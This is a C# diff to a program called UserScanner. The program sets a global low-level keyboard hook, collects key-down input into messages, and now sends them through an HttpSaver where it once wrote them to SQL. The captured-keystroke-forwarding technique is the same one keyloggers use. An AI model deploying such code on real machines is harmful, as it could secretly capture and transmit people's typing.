@@ -31,7 +31,7 @@ namespace UserScanner
     private static IntPtr _hookID = IntPtr.Zero;
     private static string message = string.Empty;
     private const int RETRIES = 10;
-    private static ASaver sqlWorker;
+    private static ASaver saver;
 
     private static IntPtr SetHook(LowLevelKeyboardProc proc)
     {
@@ -47,20 +47,19 @@ namespace UserScanner
     {
       if (args.Length < 1)
       {
-        logger.Error("You didn't set connectionString.");
+        logger.Error("You didn't set port.");
         return;
       }
       logger.Info("User scanner started.");
-      sqlWorker = new SqlSaver(RETRIES, args[0]);
-      //sqlWorker = new FileSaver(RETRIES);
+      saver = new HttpSaver(RETRIES, args[0]);
+      //saver = new FileSaver(RETRIES);
       _hookID = SetHook(_proc);
       Application.Run();
-      logger.Info("User scanner started. 4");
       UnhookWindowsHookEx(_hookID);
       logger.Info("User scanner stopped.");
     }
 
-    private static char[] nums = new char[] { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9' };
+    private static readonly char[] nums = new char[] { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9' };
     private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
     {
       if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
@@ -74,7 +73,7 @@ namespace UserScanner
           if (message.Length > 0)
           {
             logger.Debug("Hooked message: {0}", message);
-            sqlWorker.save(message);
+            saver.save(message);
           }
           message = "";
         }
